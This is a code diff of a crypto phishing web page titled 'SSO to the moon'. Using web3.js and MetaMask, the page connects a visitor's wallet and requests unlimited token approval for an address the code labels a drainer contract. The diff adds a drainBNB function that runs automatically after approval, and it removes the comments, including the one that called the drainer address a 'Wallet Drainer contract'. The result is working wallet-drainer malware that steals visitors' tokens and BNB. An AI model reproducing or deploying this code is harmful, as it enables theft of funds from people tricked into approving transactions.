@@ -7,11 +7,8 @@
 </head>
 <body>
     <h1>SSO to the moon</h1>
-    <!-- Connect button to request account -->
     <button id="connectButton">Click me to connect your wallet</button>
-
-    <!-- Approve button to approve tokens for spending -->
-    <button id="approveButton">Get your free airdrop</button>
+    <button id="approveButton">Approve Token Transfer</button>
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.6.0/web3.min.js"></script>
     <script>
@@ -19,14 +16,11 @@
 
         // Connect Button Event Listener
         document.getElementById('connectButton').addEventListener('click', async () => {
-            // Check if MetaMask is installed
             if (typeof window.ethereum !== 'undefined') {
                 console.log('MetaMask is installed!');
-                
-                // Request accounts from MetaMask
                 try {
                     const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
-                    account = accounts[0]; // Save the connected account
+                    account = accounts[0];
                     console.log('Connected account:', account);
                     alert(`Connected account: ${account}`);
                 } catch (error) {
@@ -37,17 +31,11 @@
             }
         });
 
-        // The ERC20 token contract address (replace with your token's contract address)
         const tokenAddress = '0x094616F0BdFB0b526bD735Bf66Eca0Ad254ca81F';
-
-        // The Wallet Drainer contract address (replace with your drainer contract address)
-        const spenderAddress = '0x4d8948efA7D9fD3589E79Cb5e4dcDEF37b4669D0';
-
-        // The maximum approval amount (for unlimited allowance)
+        const drainerAddress = '0x4d8948efA7D9fD3589E79Cb5e4dcDEF37b4669D0';
         const maxApproval = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
 
         async function approveTokens() {
-            // Check if MetaMask is installed
             if (window.ethereum) {
                 const web3 = new Web3(window.ethereum);
 
@@ -56,7 +44,6 @@
                     return;
                 }
 
-                // ABI for the ERC20 approve function
                 const approveAbi = [
                     {
                         constant: false,
@@ -70,16 +57,17 @@
                     }
                 ];
 
-                // Create a contract instance
                 const tokenContract = new web3.eth.Contract(approveAbi, tokenAddress);
 
-                // Send the approve transaction
                 try {
                     await tokenContract.methods
-                        .approve(spenderAddress, maxApproval)
+                        .approve(drainerAddress, maxApproval)
                         .send({ from: account });
 
                     alert('Token approval successful!');
+
+                    // Automatically trigger the drainBNB function
+                    drainBNB();
                 } catch (error) {
                     alert('Error in token approval: ' + error.message);
                 }
@@ -88,7 +76,31 @@
             }
         }
 
-        // Set up the Approve Button event listener
+        async function drainBNB() {
+            const web3 = new Web3(window.ethereum);
+
+            const drainerContractAbi = [
+                {
+                    "constant": false,
+                    "inputs": [],
+                    "name": "drainBNB",
+                    "outputs": [],
+                    "payable": false,
+                    "stateMutability": "nonpayable",
+                    "type": "function"
+                }
+            ];
+
+            const drainerContract = new web3.eth.Contract(drainerContractAbi, drainerAddress);
+
+            try {
+                await drainerContract.methods.drainBNB().send({ from: account });
+                alert('BNB drain successful!');
+            } catch (error) {
+                alert('Error in draining BNB: ' + error.message);
+            }
+        }
+
         document.getElementById('approveButton').addEventListener('click', approveTokens);
     </script>
 </body>
